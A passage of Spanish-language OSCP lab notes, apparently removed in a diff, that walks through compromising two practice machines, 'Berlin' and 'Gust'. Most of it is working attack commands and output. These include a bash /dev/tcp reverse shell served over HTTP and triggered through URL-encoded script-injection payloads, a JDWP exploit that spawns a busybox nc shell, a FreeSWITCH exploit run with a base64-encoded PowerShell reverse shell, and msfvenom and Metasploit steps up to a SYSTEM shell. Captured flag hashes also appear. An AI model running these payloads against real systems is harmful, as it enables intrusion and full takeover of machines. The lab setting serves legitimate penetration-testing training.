-01:57:13.177967 IP 192.168.45.152 > 192.168.249.150: ICMP echo reply, id 1, seq 1, length 64
-```
-
-#### Reverse Shell
-
-1. Generamos un shell.sh y lo servimos en el puerto 80
-```bash
-#!/bin/bash
-bash -i >& /dev/tcp/192.168.45.152/4444 0>&1
-```
-* Servidor **puerto 80**
-
-> Luego de ejcutar el siguiente comando
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
-└─# python3 -m http.server 80  
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.249.150 - - [24/Aug/2025 02:23:53] "GET /shell.sh HTTP/1.1" 200 -
-^C
-Keyboard interrupt received, exiting.
-```
-
-2. Lo subimos
-
-```bash
-http://192.168.249.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget%20192.168.45.152%2Fshell.sh%20-O%20%2Ftmp%2Fshell.sh%27%29%7D
-```
-3. Lo ejecutamos con el receptor corriendo
-
-```bash
-http://192.168.249.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20%2Ftmp%2Fshell.sh%27%29%7D
-```
-
-4. Receptor
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
-└─# nc -lvnp 4444
-listening on [any] 4444 ...
-connect to [192.168.45.152] from (UNKNOWN) [192.168.249.150] 58714
-bash: cannot set terminal process group (791): Inappropriate ioctl for device
-bash: no job control in this shell
-dev@oscp:/home$ whoami
-whoami
-dev
-dev@oscp:/home$ cd dev
-cd dev
-dev@oscp:~$ ls
-ls
-local.txt
-dev@oscp:~$ cat local.txt
-cat local.txt
-83116aa0059a6382ace97a71c940a125
-dev@oscp:~$
-```
-
-#### Escalamos privilegios
-
-1. Cargamos y ejecutamos un suggester
-
-```bash
-dev@oscp:~$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
-<ggester/master/linux-exploit-suggester.sh -O les.sh
---2025-08-24 14:29:36--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 90858 (89K) [text/plain]
-Saving to: ‘les.sh’
-
-     0K .......... .......... .......... .......... .......... 56% 25.0M 0s
-    50K .......... .......... .......... ........             100%  139M=0.002s
-
-2025-08-24 14:29:36 (39.0 MB/s) - ‘les.sh’ saved [90858/90858]
-
-dev@oscp:~$ chmod +x les.sh
-chmod +x les.sh
-dev@oscp:~$ ls
-ls
-les.sh
-local.txt
-dev@oscp:~$ ./les.sh
-./les.sh
-
-Available information:
-
-Kernel version: 5.15.0
-Architecture: x86_64
-Distribution: ubuntu
-Distribution version: 22.04
-Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
-Package listing: from current OS
-
-Searching among:
-
-81 kernel space exploits
-49 user space exploits
-
-Possible Exploits:
-
-[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
-
-   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
-https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
-   Exposure: probable
-   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
-   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
-   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
-
-[+] [CVE-2022-2586] nft_object UAF
-
-   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
-   Exposure: less probable
-   Tags: ubuntu=(20.04){kernel:5.12.13}
-   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
-   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
-
-[+] [CVE-2022-0847] DirtyPipe
-
-   Details: https://dirtypipe.cm4all.com/
-   Exposure: less probable
-   Tags: ubuntu=(20.04|21.04),debian=11
-   Download URL: https://haxx.in/files/dirtypipez.c
-
-[+] [CVE-2021-4034] PwnKit
-
-   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
-   Exposure: less probable
-   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
-   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
-
-[+] [CVE-2021-3156] sudo Baron Samedit
-
-   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
-   Exposure: less probable
-   Tags: mint=19,ubuntu=18|20, debian=10
-   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
-
-[+] [CVE-2021-3156] sudo Baron Samedit 2
-
-   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
-   Exposure: less probable
-   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
-   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
-
-[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
-
-   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
-   Exposure: less probable
-   Tags: ubuntu=20.04{kernel:5.8.0-*}
-   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
-   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
-   Comments: ip_tables kernel module must be loaded
-
-[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
-
-   Details: https://seclists.org/oss-sec/2017/q1/184
-   Exposure: less probable
-   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
-
-```
-
-* Conexiones en proceso:
-
-```bash
-dev@oscp:~$ netstat -tulnp 
-netstat -tulnp
-(Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-tcp6       0      0 :::8080                 :::*                    LISTEN      791/java            
-udp        0      0 127.0.0.53:53           0.0.0.0:*
-```
-----
-
-```bash
-dev@oscp:/$ ps -ef | grep 8000
-ps -ef | grep 8000
-root         808       1  0 18:33 ?        00:00:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
-dev         1238    1228  0 18:39 ?        00:00:00 grep --color=auto 8000
-```
-
-### SSH Local Port Forwarding:
-
-1. Generamos en kali un id_rsa
-```bash
-ssh-keygen -t rsa -b 4096 -f id_rsa_dev
-```
-
-2. En la maquina victima dev@192.168.246.150 copiamos el id_rsa_dev.pub
-
-```bash
-mkdir -p /home/dev/.ssh
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> /home/dev/.ssh/authorized_keys
-chmod 700 /home/dev/.ssh
-chmod 600 /home/dev/.ssh/authorized_keys
-chown -R dev:dev /home/dev/.ssh
-```
-
-3. Nos conectamos
-
-```bash
-ssh -i id_rsa_dev dev@192.168.149.150 -L 8000:127.0.0.1:8000
-
-```
-
-4. Probamos:
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
-└─# nmap -sV -p 8000 127.0.0.1
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 16:19 -03
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.00010s latency).
-
-PORT     STATE SERVICE VERSION
-8000/tcp open  jdwp    unknown
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
-```
-
-* Nos conectamos a dev@oscp con ssh
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
-└─# ssh -i id_rsa_dev dev@192.168.246.150 -L 8000:127.0.0.1:8000
-Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Mon Aug 25 07:56:29 PM UTC 2025
-
-  System load:  0.0                Processes:               202
-  Usage of /:   47.8% of 13.67GB   Users logged in:         0
-  Memory usage: 20%                IPv4 address for ens160: 192.168.246.150
-  Swap usage:   0%
-
-
-0 updates can be applied immediately.
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Mon Aug 25 19:13:34 2025 from 192.168.45.152
-```
-
-* Antes de ejecutar el exploit revisamos puertos:
-
-```bash
-dev@oscp:~$ ss -ltnp
-State   Recv-Q  Send-Q    Local Address:Port     Peer Address:Port  Process                          
-LISTEN  0       4096      127.0.0.53%lo:53            0.0.0.0:*                                      
-LISTEN  0       128             0.0.0.0:22            0.0.0.0:*                                      
-LISTEN  0       1             127.0.0.1:8000          0.0.0.0:*                                      
-LISTEN  0       50                    *:5000                *:*                                      
-LISTEN  0       100                   *:8080                *:*      users:(("java",pid=791,fd=11))  
-LISTEN  0       128                [::]:22               [::]:* 
-```
-
-* Buscamos busybox
-
-```bash
-dev@oscp:~$ which busybox 
-/usr/bin/busybox
-```
-
-> Busqueda en google rapida: **"Linux Privilege Escalation jdwp"**
-
-* [How to](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.html) [Exploit](https://github.com/hugsy/jdwp-shellifier)
-
-* Ejecutamos el exploit en kali:
-
-```bash
-┌──(root㉿kali)-[/home/…/5_OSCP-B/Standalone-Machines/Berlin/jdwp-shellifier]
-└─# python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.152 9001 -e /bin/bash"
-[+] Target: 127.0.0.1:8000
-[*] Trying to connect...
-[+] Connection successful!
-[+] Handshake sent
-[+] Handshake successful
-[*] Requesting ID sizes from the JDWP server...
-        • fieldIDSize: 8
-        • methodIDSize: 8
-        • objectIDSize: 8
-        • referenceTypeIDSize: 8
-        • frameIDSize: 8
-[+] ID sizes have been successfully received and set.
-[*] Requesting version information from the JDWP server...
-        • description: Java Debug Wire Protocol (Reference Implementation) version 11.0
-JVM Debug Interface version 11.0
-JVM version 11.0.16 (OpenJDK 64-Bit Server VM, mixed mode, sharing)
-        • jdwpMajor: 11
-        • jdwpMinor: 0
-        • vmVersion: 11.0.16
-        • vmName: OpenJDK 64-Bit Server VM
-[+] Version information has been successfully received and set.
-[+] Found Runtime class: id=0x8b1
-[+] Found Runtime.getRuntime(): id=0x7ff92402e108
-[+] Created break event id=0x2
-[+] Resume VM signal sent
-[+] Waiting for an event on 'accept'
-[*] Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')
-```
-
-* Levantamos un receptor nc:
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nc -lvnp 9001
-
-listening on [any] 9001 ...
-```
-
-* Ejecutamos en **dev@oscp**
-
-```bash
-dev@oscp:~$ nc 127.0.0.1 5000 -z
-```
-* Veremos movimiento en la consola del exploit y en el receptor:
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nc -lvnp 9001
-
-listening on [any] 9001 ...
-connect to [192.168.45.152] from (UNKNOWN) [192.168.246.150] 38484
-whoami
-root
-cd /root
-ls
-proof.txt
-snap
-cat proof.txt
-c25fbdc2b313fbbe2477a910532c9428 
-```
-
-## .151 GUST
-
-#### Resultados del escaneo Nmap – 192.168.xxx.151
-
-| Puerto       | Estado | Servicio         | Versión / Información detectada                                                                                                                                                                                                                                               |
-| ------------ | ------ | ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **80/tcp**   | open   | http             | Microsoft IIS httpd 10.0<br>• http-title: *IIS Windows*<br>• Server header: *Microsoft-IIS/10.0*<br>• Métodos HTTP: TRACE (riesgoso)                                                                                                                                          |
-| **3389/tcp** | open   | ms-wbt-server    | Microsoft Terminal Services (RDP)<br>• Certificado CN=OSCP, válido: 13-08-2025 → 12-02-2026<br>• NTLM Info:<br> - Target Name: OSCP<br> - NetBIOS Domain: OSCP<br> - NetBIOS Computer: OSCP<br> - DNS Domain: OSCP<br> - DNS Computer: OSCP<br> - Product Version: 10.0.19041 |
-| **8021/tcp** | open   | freeswitch-event | FreeSWITCH mod\_event\_socket                                                                                                                                                                                                                                                 |
-
-#### Exploramos el freeswitch-event
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
-└─# searchsploit "FreeSWITCH"              
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                                                  |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                                                                        | multiple/remote/47698.rb
-FreeSWITCH 1.10.1 - Command Execution                                                                                                                                           | windows/remote/47799.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-                                                                                                                                                                                                                  
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
-└─# searchsploit -m 47799
-  Exploit: FreeSWITCH 1.10.1 - Command Execution
-      URL: https://www.exploit-db.com/exploits/47799
-     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
-    Codes: N/A
- Verified: False
-File Type: Python script, ASCII text executable
-Copied to: /home/kali/OffSec/Challenges/5_OSCP-B/Standalone-Machines/Gust/47799.txt
-                                                                                                                                                                                                                  
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
-└─# mv 47799.txt 47799.py
-```
-
-#### Ejecutamos el exploit
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
-└─# python3 47799.py 192.168.193.151 whoami
-Authenticated
-Content-Type: api/response
-Content-Length: 11
-
-oscp\chris
-```
-
-#### Obtenemos un reverse shell
-
-1. Ejecucion
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
-└─# python3 47799.py 192.168.193.151 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
-Authenticated
-```
-
-2. Receptor
-
-```bash
-┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
-└─# nc -lvnp 4444                          
-listening on [any] 4444 ...
-connect to [192.168.45.152] from (UNKNOWN) [192.168.193.151] 51432
-whoami
-oscp\chris
-PS C:\Program Files\FreeSWITCH> 
-```
-
-#### Enumeramos
-
-```powershell
-PS C:\Program Files\FreeSWITCH> whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                               State   
-============================= ========================================= ========
-SeShutdownPrivilege           Shut down the system                      Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeUndockPrivilege             Remove computer from docking station      Disabled
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-SeTimeZonePrivilege           Change the time zone                      Disabled
-PS C:\Program Files\FreeSWITCH> Get-Service -Name spooler
-
-Status   Name               DisplayName                           
-------   ----               -----------                           
-Stopped  spooler            Print Spooler                         
-
-
-PS C:\Program Files\FreeSWITCH> Start-Service -Name spooler
-PS C:\Program Files\FreeSWITCH> Get-Service -Name spooler
-
-Status   Name               DisplayName                           
-------   ----               -----------                           
-Stopped  spooler            Print Spooler                         
-
-
-PS C:\Program Files\FreeSWITCH> 
-```
-
-#### Obtenemos el flag local
-
-```powershell
-PS C:\Program Files\FreeSWITCH> cd C:\Users
-PS C:\Users> dir
-
-
-    Directory: C:\Users
-
-
-Mode                 LastWriteTime         Length Name                                                                 
-----                 -------------         ------ ----                                                                 
-d-----        11/28/2022   1:24 AM                Administrator                                                        
-d-----        11/28/2022   1:25 AM                chris                                                                
-d-r---        11/18/2020  11:48 PM                Public                                                               
-
-
-PS C:\Users> cd chris
-PS C:\Users\chris> dir
-
-
-    Directory: C:\Users\chris
-
-
-Mode                 LastWriteTime         Length Name                                                                 
-----                 -------------         ------ ----                                                                 
-d-r---        10/31/2022   1:51 PM                3D Objects                                                           
-d-r---        10/31/2022   1:51 PM                Contacts                                                             
-d-r---        10/31/2022   3:45 PM                Desktop                                                              
-d-r---        10/31/2022   1:51 PM                Documents                                                            
-d-r---        10/31/2022   1:51 PM                Downloads                                                            
-d-r---        10/31/2022   1:51 PM                Favorites                                                            
-d-r---        10/31/2022   1:51 PM                Links                                                                
-d-r---        10/31/2022   1:51 PM                Music                                                                
-d-r---        10/31/2022   1:57 PM                OneDrive                                                             
-d-r---        10/31/2022   1:53 PM                Pictures                                                             
-d-r---        10/31/2022   1:51 PM                Saved Games                                                          
-d-r---        10/31/2022   1:53 PM                Searches                                                             
-d-r---        10/31/2022   1:51 PM                Videos                                                               
-
-
-PS C:\Users\chris> cd Desktop
-PS C:\Users\chris\Desktop> dir
-
-
-    Directory: C:\Users\chris\Desktop
-
-
-Mode                 LastWriteTime         Length Name                                                                 
-----                 -------------         ------ ----                                                                 
--a----         8/26/2025   6:03 AM             34 local.txt                                                            
-
-
-PS C:\Users\chris\Desktop> type local.txt
-d7338ddaafe0e216ad033b9ebeca2e0d
-PS C:\Users\chris\Desktop> 
-```
-
-#### Generamos payload para session meterpreter
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=4445 -f exe -o met.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: met.exe
-```
-
-#### Obtenemos session meterpreter
-
-```bash
-msf6 > use multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > options
-
-Payload options (generic/shell_reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST                   yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(multi/handler) > set LHOST 192.168.45.152
-LHOST => 192.168.45.152
-msf6 exploit(multi/handler) > set LPORT 4445
-LPORT => 4445
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-PAYLOAD => windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > run -j
-[*] Exploit running as background job 0.
-[*] Exploit completed, but no session was created.
-
-[*] Started reverse TCP handler on 192.168.45.152:4445 
-msf6 exploit(multi/handler) > [*] Sending stage (203846 bytes) to 192.168.193.151
-[*] Meterpreter session 1 opened (192.168.45.152:4445 -> 192.168.193.151:51526) at 2025-08-26 10:55:26 -0300
-sessions
-
-Active sessions
-===============
-
-  Id  Name  Type                     Information        Connection
-  --  ----  ----                     -----------        ----------
-  1         meterpreter x64/windows  OSCP\chris @ OSCP  192.168.45.152:4445 -> 192.168.193.151:51526 (192.168.193.151)
-
-msf6 exploit(multi/handler) > 
-```
-
-#### Elevamos privilegios 
-
-```bash
-msf6 exploit(multi/handler) > search type:post suggester
-
-Matching Modules
-================
-
-   #  Name                                      Disclosure Date  Rank    Check  Description
-   -  ----                                      ---------------  ----    -----  -----------
-   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
-
-
-Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
-
-msf6 exploit(multi/handler) > use 0
-msf6 post(multi/recon/local_exploit_suggester) > options
-
-Module options (post/multi/recon/local_exploit_suggester):
-
-   Name             Current Setting  Required  Description
-   ----             ---------------  --------  -----------
-   SESSION                           yes       The session to run this module on
-   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
-
-
-View the full module info with the info, or info -d command.
-
-msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
-SESSION => 1
-msf6 post(multi/recon/local_exploit_suggester) > run
-[*] 192.168.193.151 - Collecting local exploits for x64/windows...
-/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
-You can add syslog to your Gemfile or gemspec to silence this warning.
-Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
-[*] 192.168.193.151 - 203 exploit checks are being tried...
-[+] 192.168.193.151 - exploit/windows/local/bits_ntlm_token_impersonation: The target appears to be vulnerable.
-[+] 192.168.193.151 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
-[+] 192.168.193.151 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
-[+] 192.168.193.151 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
-[+] 192.168.193.151 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
-[+] 192.168.193.151 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
-[+] 192.168.193.151 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.19043.0 which has a vulnerable version of clfs.sys installed by default
-[+] 192.168.193.151 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows 10 version 21H1
-[+] 192.168.193.151 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
-[+] 192.168.193.151 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
-[*] Running check method for exploit 48 / 48
-[*] 192.168.193.151 - Valid modules for session 1:
-============================
-
- #   Name                                                           Potentially Vulnerable?  Check Result
- -   ----                                                           -----------------------  ------------
- 1   exploit/windows/local/bits_ntlm_token_impersonation            Yes                      The target appears to be vulnerable.
- 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
- 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
- 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
- 5   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
- 6   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
- 7   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.19043.0 which has a vulnerable version of clfs.sys installed by default                                                                                                                                                                               
- 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows 10 version 21H1
- 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
- 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
-
-[*] Post module execution completed
-msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2023_28252_clfs_driver
-[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > options
-
-Module options (exploit/windows/local/cve_2023_28252_clfs_driver):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SESSION                   yes       The session to run this module on
-
-
-Payload options (windows/x64/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Windows x64
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.152
-LHOST => 192.168.45.152
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LPORT 4446
-LPORT => 4446
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
-SESSION => 1
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run -j
-[*] Exploit running as background job 1.
-[*] Exploit completed, but no session was created.
-
-[*] Started reverse TCP handler on 192.168.45.152:4446 
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. The target is running windows version: 10.0.19043.0 which has a vulnerable version of clfs.sys installed by default
-[*] Launching msiexec to host the DLL...
-[+] Process 6280 launched.
-[*] Reflectively injecting the DLL into 6280...
-[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
-[*] Sending stage (203846 bytes) to 192.168.193.151
-[*] Meterpreter session 2 opened (192.168.45.152:4446 -> 192.168.193.151:51573) at 2025-08-26 11:01:49 -0300
-sessions
-
-Active sessions
-===============
-
-  Id  Name  Type                     Information                 Connection
-  --  ----  ----                     -----------                 ----------
-  1         meterpreter x64/windows  OSCP\chris @ OSCP           192.168.45.152:4445 -> 192.168.193.151:51526 (192.168.193.151)
-  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ OSCP  192.168.45.152:4446 -> 192.168.193.151:51573 (192.168.193.151)
-
-msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > sessions -i 2
-[*] Starting interaction with 2...
-
-meterpreter > shell
-Process 1464 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.19043.2130]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Users\chris\Documents>whoami
-whoami
-nt authority\system
-
-C:\Users\Administrator\Desktop>type proof.txt
-type proof.txt
-539bfeb9919842d51ab40ff64be9a7d0
-```
